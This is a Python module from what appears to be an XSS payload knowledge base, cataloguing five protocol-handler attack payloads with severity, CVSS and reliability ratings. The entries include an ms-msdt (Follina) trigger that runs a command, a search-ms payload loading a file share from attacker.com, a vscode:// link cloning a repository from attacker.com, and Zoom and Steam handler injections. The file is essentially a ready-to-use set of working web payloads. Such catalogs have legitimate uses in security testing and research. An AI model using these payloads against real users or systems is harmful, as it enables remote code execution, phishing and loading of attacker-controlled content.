#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Protocol Handler RCE Vectors via XSS
"""

from ..models import PayloadEntry

PROTOCOL_RCE_PAYLOADS = {
    "msdt_follina_trigger": PayloadEntry(
        payload="window.location.href='ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=$(calc) IT_AutoRun=1\"';",
        contexts=["javascript", "url", "protocol_handler"],
        severity="critical",
        cvss_score=9.8,
        description="Triggering MSDT (Follina) RCE via XSS (Legacy/Unpatched)",
        tags=["protocol", "ms-msdt", "rce", "windows"],
        reliability="low",
        attack_surface="desktop-bridge"
    ),
    "search_ms_abuse": PayloadEntry(
        payload="window.location.href='search-ms:query=malware&crumb=location:\\\\attacker.com\\share';",
        contexts=["javascript", "url", "protocol_handler"],
        severity="high",
        cvss_score=8.8,
        description="Abusing search-ms protocol to load remote file share",
        tags=["protocol", "search-ms", "smb", "phishing"],
        reliability="medium",
        attack_surface="desktop-bridge"
    ),
    "vscode_url_handler": PayloadEntry(
        payload="<a href='vscode://vscode.git/clone?url=http://attacker.com/repo.git'>Click me</a>",
        contexts=["html_content", "protocol_handler"],
        severity="medium",
        cvss_score=6.5,
        description="VSCode protocol handler abuse to clone malicious repo",
        tags=["protocol", "vscode", "git"],
        reliability="high",
        attack_surface="developer-tool"
    ),
    "zoom_mtg_downgrade": PayloadEntry(
        payload="window.location='zoommtg://zoom.us/join?confno=123&mep=1';",
        contexts=["javascript", "protocol_handler"],
        severity="medium",
        cvss_score=5.5,
        description="Zoom protocol injection (DOS or nuisance)",
        tags=["protocol", "zoom", "dos"],
        reliability="high",
        attack_surface="desktop-app"
    ),
    "steam_browser_protocol": PayloadEntry(
        payload="steam://openurl/javascript:alert(1)",
        contexts=["url", "protocol_handler"],
        severity="high",
        cvss_score=7.5,
        description="Steam protocol javascript injection (historical)",
        tags=["protocol", "steam", "historical"],
        reliability="low",
        attack_surface="gaming-client"
    )
}

PROTOCOL_RCE_TOTAL = len(PROTOCOL_RCE_PAYLOADS)
